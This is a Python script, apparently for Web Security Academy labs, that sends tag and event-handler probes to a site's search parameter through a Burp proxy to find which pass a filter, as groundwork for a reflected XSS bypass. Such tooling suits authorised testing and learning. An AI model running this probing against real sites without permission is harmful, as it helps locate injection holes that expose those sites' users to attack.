# This script searches for HTML tag and event pairs accepted by the server (200 OK) through a search query.
# Having found the above results, the tester would then perform manual testing for XSS at the target URL's search parameter.
# Validity is dependent on the webapp responding with a status code other than (200 OK) for unaccepted tags.
#  
# For example - if the server responds to a request parameter containing the HTML <b> tag with (400 Bad Request),
# we know that the server tried to process this tag and could not accept it. Therefore, we should test all possible HTML tags
# in an attempt to bypass the web app's security mechanisms.
# 
# A time delay of (2) seconds is set for each request sent to avoid flooding the target's servers too quickly.

import requests
import sys, time
import urllib3, urllib 

# Disable certificate warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# Proxy requests through Burp
burp = {'https': 'http://127.0.0.1:8080'}

# Enumerate HTML tag/event pairs that return '200 OK'
def find_Accepted_Html_Events(targetUrl, acceptedTags, htmlEventsPayload):
    for tag in acceptedTags:
        tag = tag.rstrip('>')                                                   #  e.g. '<b>' --> '<b' 
        if tag == '':
            break
        else:
            for event in htmlEventsPayload:
                url = f"{targetUrl}?search={tag} {event}"                       # e.g. https://0a8700710373e1b1c05317cb00110049.web-security-academy.net/?search=<svg animatetransform>  (URL encoded)
                r = requests.get(url, verify=False, proxies=burp)
                time.sleep(2)
                if r.status_code == 200:
                    print(f"Accepted pair: {tag} {event}")

# Enumerate tags that return '200 OK'
def find_Accepted_Html_Tags(targetUrl, tagsPayload, htmlEventsPayload):
    acceptedTags = []
    for tag in tagsPayload:
        if tag == '':
           break
        else:
            url = f"{targetUrl}?search={tag}"                                   # e.g. https://0a8700710373e1b1c05317cb00110049.web-security-academy.net/?search=<b>  (URL encoded)
            r = requests.get(url, verify=False, proxies=burp)
            time.sleep(2)
            if r.status_code == 200:
               acceptedTags.append(tag)                                   
    find_Accepted_Html_Events(targetUrl, acceptedTags, htmlEventsPayload)       # Send valid tags to now be tested for accepted events

# Set up HTML events payload from events file
def html_Events_File(targetUrl, tagsPayload):
    htmlEventsFilePath = 'D:\EH-Tools\Payloads\XSS\html-events.txt'
    htmlEventsFile = open(htmlEventsFilePath, 'r')
    file = htmlEventsFile.readlines()
    htmlEventsPayload = []
    for event in file:
        htmlKeyword = event.strip('\n').lower()
        htmlEventsPayload.append(htmlKeyword + '>')                             # e.g. turns 'onload' --> 'onload>'
        htmlEventsFile.close()
    find_Accepted_Html_Tags(targetUrl, tagsPayload, htmlEventsPayload)

# Set up HTML tags payload from tags file
def html_Tags_File(targetUrl):
    htmlTagsFilePath = 'D:\EH-Tools\Payloads\XSS\html-tags.txt'               
    htmlTagsFile = open(htmlTagsFilePath, 'r')                         
    file = htmlTagsFile.readlines()
    tagsPayload = []
    for tag in file:
        keyword = tag.strip('\n').lower()
        tagsPayload.append('<' + keyword + '>')                                 # e.g. turns 'b' --> '<b>'
    html_Events_File(targetUrl, tagsPayload)                                                                                                             
    htmlTagsFile.close()

def main():
    if len(sys.argv) !=2:                                                       # If input is NOT: <program name> <target URL>
        print("(+) Usage: %s <url>" % sys.argv[0])                              # Print example usage
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)                                                            # Exit program on incorrect run
    
    targetUrl = sys.argv[1]
    print("(+) Retrieving accepted HTML tags and events...")
    html_Tags_File(targetUrl)

if __name__ == "__main__":
    main()